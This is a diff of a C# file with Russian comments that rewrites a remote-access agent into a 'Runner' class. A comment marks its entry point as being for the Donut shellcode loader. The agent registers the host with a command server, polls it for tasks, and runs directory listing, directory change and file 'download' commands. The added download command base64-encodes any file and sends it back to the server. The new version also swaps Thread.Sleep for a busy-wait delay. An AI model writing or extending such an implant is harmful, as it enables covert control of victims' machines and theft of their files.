@@ -2,154 +2,143 @@
 using System.IO;
 using System.Net;
 using System.Text;
-using System.Threading;
 
-public class Loader
+public class Runner
 {
-    public static void Run(string args)
+    // Точка входа для Donut
+    public static void Start(string args)
     {
-        Agent.Start();
-        //Thread mainThread = new Thread(new ThreadStart(Agent.Start));
-        //mainThread.IsBackground = false;
-        //mainThread.Start();
+        // Все переменные и объекты объявляются локально
+        string serverUrl = "http://localhost:5000";
+        string clientId = Guid.NewGuid().ToString().Substring(0, 8);
+
+        // Основной цикл работы
+        MainLoop(serverUrl, clientId);
     }
-}
 
-public static class Agent
-{
-    private const string ServerUrl = "http://localhost:5000";
-    private const int PollIntervalMs = 3000;
-    private static string clientId = Guid.NewGuid().ToString().Substring(0, 8);
-
-    public static void Start()
+    private static void MainLoop(string serverUrl, string clientId)
     {
-        // TLS 1.2
-        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
-
-        while (true)
-        {
-            try { Register(); break; }
-            catch { Thread.Sleep(5000); }
-        }
-
+        // Регистрация
         while (true)
         {
             try
             {
-                string rawTask = PollTask();
-                if (!string.IsNullOrEmpty(rawTask))
+                string info = "{\"client_id\":\"" + clientId + "\",\"hostname\":\"" + Environment.MachineName + "\",\"os\":\"windows\"}";
+                Transmit(serverUrl, "/api/register", info);
+                break;
+            }
+            catch
+            {
+                Delay(5000);
+            }
+        }
+
+        // Основной цикл задач
+        while (true)
+        {
+            try
+            {
+                string raw = DownloadString(serverUrl + "/api/tasks/" + clientId);
+                if (!string.IsNullOrEmpty(raw) && raw.Contains("\"id\""))
                 {
-                    string taskId = GetJsonValue(rawTask, "id");
-                    string result = HandleTask(rawTask);
-                    SubmitResult(taskId, result);
+                    string tid = Extract(raw, "\"id\":\"", "\"");
+                    string cmd = Extract(raw, "\"command\":\"", "\"");
+                    string arg = Extract(raw, "\"args\":\"", "\"");
+
+                    string result = HandleTask(cmd, arg);
+                    Transmit(serverUrl, "/api/results/" + clientId, "{\"task_id\":\"" + tid + "\",\"result\":" + result + "}");
                 }
             }
-            catch { /* retry */ }
-            Thread.Sleep(PollIntervalMs);
+            catch { }
+            Delay(3000);
         }
     }
 
-    static void Register()
+    // Минимальный HTTP POST
+    private static string Transmit(string serverUrl, string path, string json)
     {
-        using (var wc = new WebClient())
-        {
-            // Ручная сборка JSON
-            string json = string.Format(
-                "{{\"client_id\":\"{0}\",\"hostname\":\"{1}\",\"username\":\"{2}\",\"os\":\"windows\",\"cwd\":\"{3}\"}}",
-                clientId, Environment.MachineName, Environment.UserName, Directory.GetCurrentDirectory().Replace("\\", "\\\\"));
-
-            wc.Headers[HttpRequestHeader.ContentType] = "application/json";
-            wc.UploadString(ServerUrl + "/api/register", json);
-        }
+        var req = (HttpWebRequest)WebRequest.Create(serverUrl + path);
+        req.Method = "POST";
+        req.ContentType = "application/json";
+        byte[] data = Encoding.UTF8.GetBytes(json);
+        req.ContentLength = data.Length;
+        using (var stream = req.GetRequestStream())
+            stream.Write(data, 0, data.Length);
+        using (var resp = (HttpWebResponse)req.GetResponse())
+        using (var sr = new StreamReader(resp.GetResponseStream()))
+            return sr.ReadToEnd();
     }
 
-    static string PollTask()
+    // Минимальный HTTP GET
+    private static string DownloadString(string url)
     {
-        using (var wc = new WebClient())
-        {
-            string resp = wc.DownloadString(ServerUrl + "/api/tasks/" + clientId);
-            // Предполагаем, что сервер возвращает {"task": {"id":"...","command":"..."}} или {}
-            if (resp.Contains("\"task\"") && !resp.Contains("\"task\":null"))
-                return resp;
-            return null;
-        }
+        var req = (HttpWebRequest)WebRequest.Create(url);
+        req.Method = "GET";
+        using (var resp = (HttpWebResponse)req.GetResponse())
+        using (var sr = new StreamReader(resp.GetResponseStream()))
+            return sr.ReadToEnd();
     }
 
-    static void SubmitResult(string taskId, string resultJson)
+    // Минимальная задержка без Thread.Sleep
+    private static void Delay(int ms)
     {
-        using (var wc = new WebClient())
-        {
-            string payload = string.Format("{{\"task_id\":\"{0}\",\"result\":{1}}}", taskId, resultJson);
-            wc.Headers[HttpRequestHeader.ContentType] = "application/json";
-            wc.UploadString(ServerUrl + "/api/results/" + clientId, payload);
-        }
+        var until = DateTime.UtcNow.AddMilliseconds(ms);
+        while (DateTime.UtcNow < until) ;
     }
 
-    static string HandleTask(string taskRaw)
-    {
-        string cmd = GetJsonValue(taskRaw, "command");
-        string args = GetJsonValue(taskRaw, "args");
-
-        switch (cmd)
-        {
-            case "ls": return DoLs(args);
-            case "pwd": return string.Format("{{\"output\":\"{0}\"}}", Directory.GetCurrentDirectory().Replace("\\", "\\\\"));
-            case "ping": return "{\"output\":\"pong\"}";
-            default: return string.Format("{{\"error\":\"Unknown command: {0}\"}}", cmd);
-        }
-    }
-
-    // Примитивный парсер JSON значений (только для строк и простых типов)
-    static string GetJsonValue(string json, string key)
-    {
-        string searchKey = "\"" + key + "\":\"";
-        int start = json.IndexOf(searchKey);
-        if (start == -1)
-        {
-            // Попытка найти без кавычек у значения (для чисел/null)
-            searchKey = "\"" + key + "\":";
-            start = json.IndexOf(searchKey);
-            if (start == -1) return "";
-            start += searchKey.Length;
-        }
-        else
-        {
-            start += searchKey.Length;
-        }
-
-        int end = json.IndexOf("\"", start);
-        if (end == -1) end = json.IndexOf(",", start);
-        if (end == -1) end = json.IndexOf("}", start);
-
-        return json.Substring(start, end - start).Trim(' ', '"');
-    }
-
-    static string DoLs(string path)
+    // Примитивный парсер JSON
+    private static string Extract(string source, string startStr, string endStr)
     {
         try
         {
-            var target = string.IsNullOrEmpty(path) ? "." : path;
-            var fullPath = Path.GetFullPath(target);
-            StringBuilder sb = new StringBuilder();
-            sb.Append("{\"entries\":[");
-
-            string[] dirs = Directory.GetDirectories(fullPath);
-            string[] files = Directory.GetFiles(fullPath);
-
-            for (int i = 0; i < dirs.Length; i++)
-            {
-                sb.Append(string.Format("{{\"name\":\"{0}\",\"is_dir\":true}}", Path.GetFileName(dirs[i])));
-                if (i < dirs.Length - 1 || files.Length > 0) sb.Append(",");
-            }
-            for (int i = 0; i < files.Length; i++)
-            {
-                sb.Append(string.Format("{{\"name\":\"{0}\",\"is_dir\":false}}", Path.GetFileName(files[i])));
-                if (i < files.Length - 1) sb.Append(",");
-            }
-
-            sb.AppendFormat("],\"path\":\"{0}\"}}", fullPath.Replace("\\", "\\\\"));
-            return sb.ToString();
+            int start = source.IndexOf(startStr) + startStr.Length;
+            int end = source.IndexOf(endStr, start);
+            return source.Substring(start, end - start);
         }
-        catch (Exception ex) { return string.Format("{{\"error\":\"{0}\"}}", ex.Message); }
+        catch { return ""; }
+    }
+
+    private static string HandleTask(string cmd, string args)
+    {
+        try
+        {
+            switch ((cmd ?? "").ToLower())
+            {
+                case "ls":
+                    string target = string.IsNullOrEmpty(args) ? "." : args;
+                    StringBuilder sb = new StringBuilder("{\"path\":\"" + Path.GetFullPath(target).Replace("\\", "\\\\") + "\",\"entries\":[");
+                    string[] dirs = Directory.GetDirectories(target);
+                    string[] files = Directory.GetFiles(target);
+
+                    foreach (var d in dirs)
+                        sb.Append("{\"name\":\"" + Path.GetFileName(d) + "\",\"is_dir\":true},");
+                    foreach (var f in files)
+                        sb.Append("{\"name\":\"" + Path.GetFileName(f) + "\",\"is_dir\":false,\"size\":" + new FileInfo(f).Length + "},");
+
+                    return sb.ToString().TrimEnd(',') + "]}";
+
+                case "cd":
+                    Directory.SetCurrentDirectory(args);
+                    return "{\"output\":\"Changed to " + Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\"}";
+
+                case "pwd":
+                    return "{\"output\":\"" + Directory.GetCurrentDirectory().Replace("\\", "\\\\") + "\"}";
+
+                case "download":
+                    if (!File.Exists(args)) return "{\"error\":\"File not found\"}";
+                    byte[] fileBytes = File.ReadAllBytes(args);
+                    return "{\"filename\":\"" + Path.GetFileName(args) + "\",\"data_b64\":\"" + Convert.ToBase64String(fileBytes) + "\"}";
+
+                case "ping":
+                    return "{\"output\":\"pong\"}";
+
+                default:
+                    return "{\"error\":\"Unknown command\"}";
+            }
+        }
+        catch (Exception e)
+        {
+            return "{\"error\":\"" + e.Message.Replace("\"", "'") + "\"}";
+        }
     }
 }
